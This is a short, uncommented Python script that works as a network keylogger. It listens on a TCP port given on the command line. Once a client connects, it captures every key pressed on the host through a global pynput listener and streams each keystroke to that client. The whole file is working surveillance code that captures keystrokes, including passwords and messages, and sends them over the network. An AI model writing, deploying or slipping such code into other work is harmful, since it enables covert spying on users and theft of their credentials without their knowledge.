import socket

from pynput.keyboard import Key, Listener
import sys


def key_press(key):
	k = str(key)
	k = k.replace("'", "")
	try:
		global conn
		conn.sendall(bytes(k, "ascii"))
	except Exception as e:
		print(e)
def main():
	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
		s.bind((HOST,PORT))
		while True:
			communicate(s)


def communicate(Socket):
	Socket.listen()
	global conn
	conn, addr = Socket.accept()
	listener = Listener(on_press=key_press)
	listener.start()
	with conn:
		print('Connected by, ', addr)
		while True:
			try:
				data = conn.recv(1024)
				print(data.decode("ASCII"))
				if len(data) == 0:
					listener.stop()
					break
			except socket.error as e:
				print("exception 1")
				print(e.errno)
				listener.stop()
				break


HOST = sys.argv[1]
PORT = int(sys.argv[2])
global conn
main()
